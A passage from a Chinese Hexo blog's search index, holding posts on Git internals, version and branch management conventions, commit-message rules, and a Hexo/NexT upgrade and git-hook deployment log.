pre-applypatch.sample</span><br><span class=\"line\">│   │   ├── pre-commit.sample</span><br><span class=\"line\">│   │   ├── pre-merge-commit.sample</span><br><span class=\"line\">│   │   ├── pre-push.sample</span><br><span class=\"line\">│   │   ├── pre-rebase.sample</span><br><span class=\"line\">│   │   ├── pre-receive.sample</span><br><span class=\"line\">│   │   ├── prepare-commit-msg.sample</span><br><span class=\"line\">│   │   ├── push-to-checkout.sample</span><br><span class=\"line\">│   │   └── update.sample</span><br><span class=\"line\">│   ├── index</span><br><span class=\"line\">│   ├── info</span><br><span class=\"line\">│   │   └── exclude</span><br><span class=\"line\">│   ├── logs</span><br><span class=\"line\">│   │   ├── HEAD</span><br><span class=\"line\">│   │   └── refs</span><br><span class=\"line\">│   │       └── heads</span><br><span class=\"line\">│   │           └── main</span><br><span class=\"line\">│   ├── objects</span><br><span class=\"line\">│   │   ├── 00</span><br><span class=\"line\">│   │   │   └── 3be49801ac2c840691131d41da7c76336463d1</span><br><span class=\"line\">│   │   ├── 2e</span><br><span class=\"line\">│   │   │   └── 5ada8bdd7e2df4f2e0a34e11915c132a2fcffd</span><br><span class=\"line\">│   │   ├── b6</span><br><span class=\"line\">│   │   │   └── 16fa8948e6b76d03540255015558f097de2954</span><br><span class=\"line\">│   │   ├── ea</span><br><span class=\"line\">│   │   │   └── dbfaedada5368037f66b3a4ce65d67e4d5db28</span><br><span class=\"line\">│   │   ├── info</span><br><span class=\"line\">│   │   └── pack</span><br><span class=\"line\">│   └── refs</span><br><span class=\"line\">│       ├── heads</span><br><span class=\"line\">│       │   └── main</span><br><span class=\"line\">│       └── tags</span><br><span class=\"line\">├── a1.txt</span><br><span class=\"line\">└── a2.txt</span><br><span class=\"line\"></span><br><span class=\"line\">17 directories, 28 files</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：git的默认设置是对文件名的大小写不敏感，因此有时修改文件不会触发修改！</p>\n</blockquote>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.zhaohuabing.com/post/2019-01-21-git/\">Git内部存储原理</a></li>\n<li><a href=\"https://www.cnblogs.com/tanshaoshenghao/p/14200420.html\">git原理学习记录：从基本指令到背后原理，实现一个简单的git</a></li>\n<li><a href=\"https://www.cnblogs.com/anding/p/16987769.html\">Git 图文教程</a></li>\n</ul>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://git-scm.com/\">Git 官方网站</a></li>\n<li><a href=\"https://github.com/git/git\">Git 源码 - Github</a></li>\n<li><a href=\"https://git-scm.com/docs\">Git 命令大全</a></li>\n<li><a href=\"https://git-scm.com/book/en/v2\">pro Git Book</a></li>\n<li><a href=\"progit.pdf\">pro Git Book 第二版 - PDF</a></li>\n</ul>\n"},{"title":"Git软件版本管理要点","url":"/2021/12/29/Git%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>传统的版本控制系统采用集中化方式（CVCS - Centralized Version Control Systems）包括CVS、Subversion 以及 Perforce 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。 多年以来，这已成为版本控制系统的标准做法。</p>\n<p>集中式版本管理系统最显而易见的缺点是中央服务器的单点故障。 如果宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。 如果中心数据库所在的磁盘发生损坏，又没有做恰当备份，毫无疑问你将丢失所有数据——包括项目的整个变更历史，只剩下人们在各自机器上保留的单独快照。 本地版本控制系统也存在类似问题，只要整个项目的历史记录被保存在单一位置，就有丢失所有历史更新记录的风险。</p>\n<p>于是，分布式版本控制系统（DVCS - Distributed Version Control System）面世了。 在这类系统中，像 Git、Mercurial、Bazaar 以及 Darcs 等，客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来，包括完整的历史记录。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。</p>\n<img src=\"/2021/12/29/Git%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/git.jpg\" class=\"\">\n\n<p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>\n<h2 id=\"二、版本规划\"><a href=\"#二、版本规划\" class=\"headerlink\" title=\"二、版本规划\"></a>二、版本规划</h2><p>通常，我们采用<code>GNU</code>风格的版本号命名格式：主版本号 . 子版本号 [. 修正版本号 [. 发行版本号 ]]。<br>即：<code>Major_Version_Number</code>.<code>Minor_Version_Number</code>[.<code>Revision_Number</code>[.<code>Build_Number</code>]]<br>示例 :<code>1.2.1</code>, <code>2.0</code>, <code>5.0.0 build-13124</code></p>\n<ul>\n<li>Major：主版本号<br>  当软件整体重写，出现不向后兼容的改变时，增加A；<br>  或者可以用来代表不同的产品型号；</li>\n<li>Minor：次版本号<br>  表示功能更新，出现新功能时(不影响 API 的兼容性)，增加B</li>\n<li>Revision：修订号<br>  表示小修改，如修复bug、更改提示语字符等(不影响 API 的兼容性)，只要有修改就增加C</li>\n<li>Build: 发行版本号</li>\n</ul>\n<h3 id=\"常见的发行版本名\"><a href=\"#常见的发行版本名\" class=\"headerlink\" title=\"常见的发行版本名\"></a>常见的发行版本名</h3><ul>\n<li>Alpha：是内测试版本，一般不向外部发布，会有很多Bug，一般只有测试人员使用</li>\n<li>Beta：是公测试版本，这个阶段的版本会一直加入新的功能，在Alpha版之后推出</li>\n<li>RC：Release Candidate，是发行候选版本，不会再加入新的功能了，主要着重于除错</li>\n<li>GA：General Availability，正式发布版本，真正的release版本</li>\n</ul>\n<p>此外，还有一些Windows等传统商业软件的版本名称：</p>\n<ul>\n<li>RTM：Release to Manufacture，是给工厂大量压片的版本，内容跟正式版是一样的，不过RTM版也有出限制、评估版的。但是和正式版本的主要程序代码都是一样的。</li>\n<li>OEM：是给计算机厂商随着计算机贩卖的，也就是随机版。只能随机器出货，不能零售。只能全新安装，不能从旧有操作系统升级。包装不像零售版精美，通常只有一面CD和说明书(授权书)。</li>\n<li>RVL：号称是正式版，其实RVL根本不是版本的名称。它是中文版&#x2F;英文版文档破解出来的。</li>\n<li>EVAL：而流通在网络上的EVAL版，与“评估版”类似，功能上和零售版没有区别。</li>\n<li>RTL：Retail，零售版是真正的正式版，正式上架零售版。在安装盘的i386文件夹里有一个eula.txt，最后有一行EULAID，就是你的版本。<br>比如简体中文正式版是EULAID:WX.4_PRO_RTL_CN，繁体中文正式版是WX.4_PRO_RTL_TW。其中：如果是WX.开头是正式版，WB.开头是测试版。_PRE，代表家庭版；_PRO，代表专业版。</li>\n</ul>\n<h2 id=\"三、分支规划\"><a href=\"#三、分支规划\" class=\"headerlink\" title=\"三、分支规划\"></a>三、分支规划</h2><h3 id=\"master分支\"><a href=\"#master分支\" class=\"headerlink\" title=\"master分支\"></a>master分支</h3><p>定义：存放随时可供在生产环境中部署的代码<br>命名：master<br>权限：由管理员负责维护，其它人只有拉取权限<br>生命周期：伴随着整个项目的生命周期，项目结束时结束<br>补充说明：当开发活动告一段落，产生了一份新的可供部署的代码时，master分支上的代码会被更新。同时，每一次更新，都有对应的版本号标签（tag）</p>\n<h3 id=\"develop分支\"><a href=\"#develop分支\" class=\"headerlink\" title=\"develop分支\"></a>develop分支</h3><p>定义：每次迭代版本的共有开发分支,保存当前最新开发成果的分支，从最新的master分支派生<br>命名：develop<br>权限：由开发人员在各自的feature分支开发完成后，合并至该分支<br>生命周期：一个阶段功能开发开始到本阶段开发结束<br>补充说明：当develop分支上的代码已实现了软件需求说明书中所有的功能，派生出release分支</p>\n<h3 id=\"release分支\"><a href=\"#release分支\" class=\"headerlink\" title=\"release分支\"></a>release分支</h3><p>定义：从develop分支派生，为发布新的产品版本而设计的，在这个分支上的代码允许做缺陷修正、准备发布版本所需的各项说明信息，develop分支可以继续进行新的开发迭代周期<br>命名：release-版本号<br>权限：由管理员从develop分支派生，由开发人员完成修复并提交，再由管理员合并回develop分支和master分支<br>生命周期：一个阶段功能测试开始到本阶段测试结束<br>补充说明：必须合并回develop分支和master分支，合并完成，删除该release分支</p>\n<h3 id=\"hotfix分支\"><a href=\"#hotfix分支\" class=\"headerlink\" title=\"hotfix分支\"></a>hotfix分支</h3><p>定义：在master分支发现bug时，在master的分支上派生出一个hotfixes分支<br>命名：hotfixes-版本号<br>权限：开发人员从master分支派生，完生修复并提交merge request，由管理人员完成合并<br>生命周期：发现master分支bug开始，完成master分支bug结束<br>补充说明：必须合并回develop分支和master分支，合并完成，删除该hotfixes分支</p>\n<h3 id=\"feature分支\"><a href=\"#feature分支\" class=\"headerlink\" title=\"feature分支\"></a>feature分支</h3><p>定义：从develop分支发起feature分支，通常是在开发一项新的软件功能的时候使用，最终合并回develop分支<br>命名：feature-开发人员-版本号<br>权限：开发人员从develop分支派生，并合并回develop分支<br>生命周期：开发一个新功能开始，完成新功能开发并合并回develop分支结束<br>补充说明：feature分支代码可以保存在开发者自己的代码库中而不强制提交到主代码库里</p>\n<h3 id=\"管理方式\"><a href=\"#管理方式\" class=\"headerlink\" title=\"管理方式\"></a>管理方式</h3><p>1、管理员在github或gitlab上建立master、develop分支<br>2、开发者从远程develop分支，拉取develop分支到本地<br>3、开发者从develop分支上建立自己的feature分支<br>4、开发者合并feature分支到develop分支，可删除自己的feature分支<br>5、管理员从develop分支派生出release分支<br>6、开发者从远程release分支，拉取release分支到本地<br>7、开发者在release分支上修复缺陷，并提交release分支<br>8、管理员合并release分支到develop分支和master分支，可删除release分支<br>9、开发者从master分支派生hotfix分支，并拉取hotfix分支到本地<br>10、开发者在hotfix分支上修复缺陷，提交hotfix分支，并提交merge request请求<br>11、管理员合并hotfix分支到master分支，可删除hotfix分支<br>12、同一产品的不同客户，可以在master分支上使用tag来标识客户的部署版本</p>\n<h2 id=\"四、常用操作命令\"><a href=\"#四、常用操作命令\" class=\"headerlink\" title=\"四、常用操作命令\"></a>四、常用操作命令</h2><p>新建本地分支：git branch &lt;分支名称&gt;<br>删除本地分支：git branch -D &lt;分支名称&gt;<br>合并本地分支：git marge &lt;要合并的分支&gt;<br>提交本地分支：git push &lt;远程主机&gt; &lt;本地分支&gt;:&lt;远程分支&gt;<br>查看本地分支：git branch<br>切换本地分支：git checkout &lt;分支名称&gt;<br>创建并切换分支：git checkout -b &lt;分支名称&gt;<br>拉取远程分支：git pull &lt;远程主机&gt; &lt;远程分支&gt;:&lt;本地分支&gt;<br>新建版本标签：git tag -a &lt;版本号&gt; -m ‘说明’<br>提交版本标签：git push &lt;远程主机&gt; –tags 或者 git push &lt;远程主机&gt; &lt;版本号&gt;<br>查看标签版本：git tag<br>获取标签版本：git checkout &lt;版本号&gt;</p>\n<h2 id=\"五、Git-commit-注释规范\"><a href=\"#五、Git-commit-注释规范\" class=\"headerlink\" title=\"五、Git commit 注释规范\"></a>五、Git commit 注释规范</h2><p>使用标准的提交注释格式后，我们可以：</p>\n<ul>\n<li>让评审人快速了解本次变更的意图，评判内容与意图的相符程度。</li>\n<li>通过脚本自动生成变更日志（CHANGELOG）</li>\n<li>识别或过滤不重要的代码变更，例如只对代码格式进行修订的那些</li>\n<li>当浏览提交历史时，可以快速得到更多且更有用的信息</li>\n</ul>\n<p>提交注释格式如下所示。它由三个段落组成，分别是：主题行，内容体和脚注，并由一个空行分隔。</p>\n<img src=\"/2021/12/29/Git%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/commit-message-example.png\" class=\"\">\n\n<h3 id=\"主题行-Header\"><a href=\"#主题行-Header\" class=\"headerlink\" title=\"主题行 Header &#x3D; &lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;\"></a>主题行 Header &#x3D; <code>&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</code></h3><h4 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h4><p>type用于说明 commit 的类别，只允许使用下面8个标识:</p>\n<ul>\n<li>br: 此项特别针对bug号，用于向测试反馈bug列表的bug修改情况</li>\n<li>feat：新功能（feature）</li>\n<li>fix：修补bug</li>\n<li>docs：文档（documentation）</li>\n<li>style： 格式（不影响代码运行的变动）</li>\n<li>refactor：重构（即不是新增功能，也不是修改bug的代码变动）</li>\n<li>test：增加测试</li>\n<li>chore：构建过程或辅助工具的变动</li>\n<li>revert: feat(pencil): add ‘graphiteWidth’ option (撤销之前的commit)</li>\n</ul>\n<h4 id=\"scope\"><a href=\"#scope\" class=\"headerlink\" title=\"scope\"></a>scope</h4><p>scope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</p>\n<h4 id=\"subject\"><a href=\"#subject\" class=\"headerlink\" title=\"subject\"></a>subject</h4><p>subject是 commit 目的的简短描述，不超过50个字符。<br>以动词开头，使用第一人称现在时，比如change，而不是changed或changes<br>第一个字母小写，结尾不加句号（.）</p>\n<p>举几个简单的例子：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">feat(compiler-cli): propagate standalone flag to runtime (#44973)</span><br><span class=\"line\">fix(router): merge interited resolved data and static data (#45276)</span><br><span class=\"line\">release: cut the v14.0.0-next.9 release (#45442)</span><br><span class=\"line\">refactor(common): removed TODO no longer considered necessary (#43378) </span><br><span class=\"line\">docs: remove Angular 9 from support table (#43350) </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"内容体-Body\"><a href=\"#内容体-Body\" class=\"headerlink\" title=\"内容体 Body\"></a>内容体 Body</h3><p>是对本次 commit 的详细描述，可以分成多行。</p>\n<p>与 summary 使用的语句形式一样，祈使句、现在时，用于解释为什么要做这样的改动，可以与上一个版本的代码做对比，来说明变化的影响。</p>\n<h3 id=\"脚注-Footer\"><a href=\"#脚注-Footer\" class=\"headerlink\" title=\"脚注 Footer\"></a>脚注 Footer</h3><p>用来描述重大不兼容的改变或者指引到相应的 issues 列表等</p>\n<p>具体可以参见<a href=\"https://github.com/angular/angular/commits/master\">Angular Github的示例</a></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://git-scm.com/book/zh/v2\">Git官方技术白皮书</a></li>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/896043488029600\">廖雪峰的Git基础教程</a></li>\n<li><a href=\"https://www.iteye.com/blog/juvenshun-376422\">Maven版本管理的最佳实践</a></li>\n<li><a href=\"https://code.visualstudio.com/Docs/editor/versioncontrol\">Vscode的版本管理插件</a></li>\n<li><a href=\"https://haicoder.net/mysql/mysql-version.html\">MySQL的版本管理</a></li>\n<li><a href=\"http://jdk.java.net/archive/\">Oracle OpenJDK的历史版本下载页</a></li>\n<li><a href=\"https://helloyyk.com/34.html\">Git Commit Message规范 - Angular</a></li>\n<li><a href=\"https://www.continuousdelivery20.com/blog/cr-good-commit-message/\">如何写好提交注释</a></li>\n</ul>\n"},{"title":"HEXO 5.4 & NEXT 8.8.2 版本升级记录","url":"/2021/12/19/HEXO-5-4-NEXT-8-8-2-%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95/","content":"<p>原来HEXO的版本是3.6，都是几年前的老东西了，最近总是提示<code>highlight.js</code>的旧版本存在安全漏洞，需要升级到10以上版本，此外由于node、next-theme-next等版本都存在不少问题，周末下定决心做一次版本升级。</p>\n<h2 id=\"一、目标版本环境\"><a href=\"#一、目标版本环境\" class=\"headerlink\" title=\"一、目标版本环境\"></a>一、目标版本环境</h2><ul>\n<li><code>node 12.22.8</code>: 最新版本v17，推荐LTS版本v16.13.1，但是由于兼容性问题，本次采用v12的最新补丁版本。<br>  另一方面，HEXO官方要求：Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本</li>\n<li><code>hexo 5.4</code>: 最新版本，2021年2月发布；相应hexo-cli的版本是4.3.0</li>\n<li><code>hexo-theme-next 8.8.2</code>: 最新版本的用户主题</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">JiandeiMac:nokiam9.github.io sj$ hexo -v</span><br><span class=\"line\">INFO  Validating config</span><br><span class=\"line\">INFO  ==================================</span><br><span class=\"line\">  ███╗   ██╗███████╗██╗  ██╗████████╗</span><br><span class=\"line\">  ████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝</span><br><span class=\"line\">  ██╔██╗ ██║█████╗   ╚███╔╝    ██║</span><br><span class=\"line\">  ██║╚██╗██║██╔══╝   ██╔██╗    ██║</span><br><span class=\"line\">  ██║ ╚████║███████╗██╔╝ ██╗   ██║</span><br><span class=\"line\">  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝</span><br><span class=\"line\">========================================</span><br><span class=\"line\">NexT version 8.8.2</span><br><span class=\"line\">Documentation: https://theme-next.js.org</span><br><span class=\"line\">========================================</span><br><span class=\"line\">hexo: 5.4.0</span><br><span class=\"line\">hexo-cli: 4.3.0</span><br><span class=\"line\">os: darwin 17.7.0 10.13.6</span><br><span class=\"line\"></span><br><span class=\"line\">node: 12.22.8</span><br><span class=\"line\">v8: 7.8.279.23-node.56</span><br><span class=\"line\">uv: 1.40.0</span><br><span class=\"line\">zlib: 1.2.11</span><br><span class=\"line\">brotli: 1.0.9</span><br><span class=\"line\">ares: 1.18.1</span><br><span class=\"line\">modules: 72</span><br><span class=\"line\">nghttp2: 1.41.0</span><br><span class=\"line\">napi: 8</span><br><span class=\"line\">llhttp: 2.1.4</span><br><span class=\"line\">http_parser: 2.9.4</span><br><span class=\"line\">openssl: 1.1.1m</span><br><span class=\"line\">cldr: 37.0</span><br><span class=\"line\">icu: 67.1</span><br><span class=\"line\">tz: 2019c</span><br><span class=\"line\">unicode: 13.0</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、hexo的升级\"><a href=\"#二、hexo的升级\" class=\"headerlink\" title=\"二、hexo的升级\"></a>二、hexo的升级</h2><p>要升级就彻底一点，把HEXO的全部依赖都升级到最新版本，参考以下步骤吧。</p>\n<h3 id=\"1-npm的全局软件更新\"><a href=\"#1-npm的全局软件更新\" class=\"headerlink\" title=\"1. npm的全局软件更新\"></a>1. npm的全局软件更新</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清理NPM缓存</span></span><br><span class=\"line\">$ npm cache clean -f</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局安装版本检测、版本升级工具</span></span><br><span class=\"line\">$ npm install -g npm-check</span><br><span class=\"line\">$ npm install -g npm-upgrade</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局检测哪些模块可以升级，这里可以根据打印的提示信息，手动安装最新版本的模块</span></span><br><span class=\"line\">$ npm-check -g</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局更新模块</span></span><br><span class=\"line\">$ npm update -g</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局安装或更新Hexo的最新版本</span></span><br><span class=\"line\">$ npm install --global hexo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-hexo当前目录的软件更新\"><a href=\"#2-hexo当前目录的软件更新\" class=\"headerlink\" title=\"2. hexo当前目录的软件更新\"></a>2. hexo当前目录的软件更新</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 进入博客的根目录</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> /blog-root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检测Hexo哪些模块可以升级</span></span><br><span class=\"line\">$ npm-check</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除package-lock.json</span></span><br><span class=\"line\"><span class=\"comment\"># rm -rf package-lock.json</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新package.json</span></span><br><span class=\"line\">$ npm-upgrade</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除整个模块目录，这样可以避免很多坑</span></span><br><span class=\"line\">$ <span class=\"built_in\">rm</span> -rf node_modules</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新Hexo的模块</span></span><br><span class=\"line\">$ npm update --save</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 若出现依赖的问题，用以下命令检查一下，然后把报错的统一修复一下即可</span></span><br><span class=\"line\">$ npm audix</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 或者强制更新</span></span><br><span class=\"line\">$ npm update --save --force</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-检查方法\"><a href=\"#3-检查方法\" class=\"headerlink\" title=\"3. 检查方法\"></a>3. 检查方法</h3><p>在上述步骤完成后，<code>package.json</code>将成为以下版本信息：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;name&quot;:</span> <span class=\"string\">&quot;hexo-site&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;0.0.0&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;private&quot;:</span> <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;hexo&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;5.4.0&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">&quot;dependencies&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;chokidar&quot;:</span> <span class=\"string\">&quot;^3.5.2&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;eslint&quot;:</span> <span class=\"string\">&quot;^8.5.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo&quot;:</span> <span class=\"string\">&quot;^5.4.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-deployer-git&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-auto-excerpt&quot;:</span> <span class=\"string\">&quot;^1.1.2&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-archive&quot;:</span> <span class=\"string\">&quot;^1.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-category&quot;:</span> <span class=\"string\">&quot;^1.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-index&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-search&quot;:</span> <span class=\"string\">&quot;^2.4.3&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-searchdb&quot;:</span> <span class=\"string\">&quot;^1.4.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-tag&quot;:</span> <span class=\"string\">&quot;^1.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-ejs&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-marked&quot;:</span> <span class=\"string\">&quot;^4.1.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-stylus&quot;:</span> <span class=\"string\">&quot;^2.0.1&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-swig&quot;:</span> <span class=\"string\">&quot;^1.1.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-server&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-theme-next&quot;:</span> <span class=\"string\">&quot;^8.8.2&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在其它开发机上，也可以依据已更新成功的<code>package.json</code>，直接通过<code>npm install</code>进行升级。</p>\n<h2 id=\"三、hexo-theme-next的升级\"><a href=\"#三、hexo-theme-next的升级\" class=\"headerlink\" title=\"三、hexo-theme-next的升级\"></a>三、hexo-theme-next的升级</h2><p>由于历史原因，next有3个不同的Github源码地址。<br>NexT 8.x 相比旧版，技术架构有重大变化，无法做到平滑升级，建议做好备份后全新安装，然后重新配置。</p>\n<table>\n<thead>\n<tr>\n<th>对比项目</th>\n<th>旧版</th>\n<th>新版</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>安装方式</td>\n<td>git</td>\n<td>npm、git</td>\n</tr>\n<tr>\n<td>安装目录</td>\n<td>themes&#x2F;next</td>\n<td>npm:node_modules&#x2F;hexo-theme-next <br> git:themes&#x2F;next</td>\n</tr>\n<tr>\n<td>模板格式</td>\n<td>swig模板</td>\n<td>nunjucks引擎</td>\n</tr>\n<tr>\n<td>字体图标</td>\n<td>Font Awesome 4.x</td>\n<td>Font Awesome 5.x</td>\n</tr>\n<tr>\n<td>配置文件</td>\n<td>hexo&#x2F;source&#x2F;_data&#x2F;next.yml</td>\n<td>hexo&#x2F;_config.next.yml</td>\n</tr>\n<tr>\n<td>源码地址</td>\n<td>v5:<a href=\"https://github.com/iissnan/hexo-theme-next\">https://github.com/iissnan/hexo-theme-next</a> <br> v6 &amp; v7:<a href=\"https://github.com/theme-next/hexo-theme-next\">https://github.com/theme-next/hexo-theme-next</a></td>\n<td>v8:<a href=\"https://github.com/next-theme/hexo-theme-next\">https://github.com/next-theme/hexo-theme-next</a></td>\n</tr>\n</tbody></table>\n<p>原来的安装方法是通过<code>git clone</code>，安装点位于<code>theme/next</code>目录；<br>现在改为<code>npm install hexo-theme-next</code>, 安装点位于<code>node_modules/hexo-theme-next</code>。</p>\n<p>原来的参数配置是：全局配置文件<code>_config.yml</code> + 主题配置文件<code>theme/next/_config.yml</code>。<br>而在next 8.8.2，主题配置文件改为<code>_config.next.yml</code>（从<code>theme/next/_config.yml</code>拷贝，并改名而来）。</p>\n<p>总体而言，npm方式更为优雅，而且目录结构得到精简。</p>\n<h2 id=\"四、如何在ECS云服务器上部署HEXO静态页面\"><a href=\"#四、如何在ECS云服务器上部署HEXO静态页面\" class=\"headerlink\" title=\"四、如何在ECS云服务器上部署HEXO静态页面\"></a>四、如何在ECS云服务器上部署HEXO静态页面</h2><p>Github提供了标准的用户主页展示功能，通过CI&#x2F;CD为HEXO的静态页面提供部署环境，默认主页域名是<code>https://xxxx.github.io</code>。<br>但是，我们也可以利用Git的钩子功能，将HEXO静态页面部署在自己的云服务器上，主要包含以下步骤：</p>\n<h3 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1. 准备工作\"></a>1. 准备工作</h3><ul>\n<li>独立的站点域名，并设置DNS指向ECS服务器</li>\n<li>在ECS服务器上安装git、nginx</li>\n<li>在ECS服务器上启动Nginx服务，并将该域名的root目录设为<code>/var/www</code></li>\n<li>在ECS服务器上添加开发机的公匙（<code>$HOME/.ssh/authorized_keys</code>），为开发机提供root用户的免密登录</li>\n</ul>\n<h3 id=\"2-ECS服务器上设置Git-Hooks\"><a href=\"#2-ECS服务器上设置Git-Hooks\" class=\"headerlink\" title=\"2. ECS服务器上设置Git Hooks\"></a>2. ECS服务器上设置Git Hooks</h3><p>基本原理：在ECS服务器部署一个git仓库，作为hexo部署(deploy)的远端git仓库，每次提交时自动触发post-receive事件，用于更新nginx的静态页面。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建一个远端仓库</span></span><br><span class=\"line\">git init --bare /root/blog.git</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建一个钩子</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /root/blog.git/hooks/post-receice &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"string\">git --work-tree=/var/www --git-dir=/root/blog.git checkout -f</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加可执行权限</span></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /root/blog.git/hooks/post-receive </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-开发机上部署hexo-depoly服务\"><a href=\"#3-开发机上部署hexo-depoly服务\" class=\"headerlink\" title=\"3. 开发机上部署hexo-depoly服务\"></a>3. 开发机上部署hexo-depoly服务</h3><p>Hexo的全局配置文件<code>_config.yml</code>中，配置hexo-depoly服务，示例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">    <span class=\"attr\">repository:</span> <span 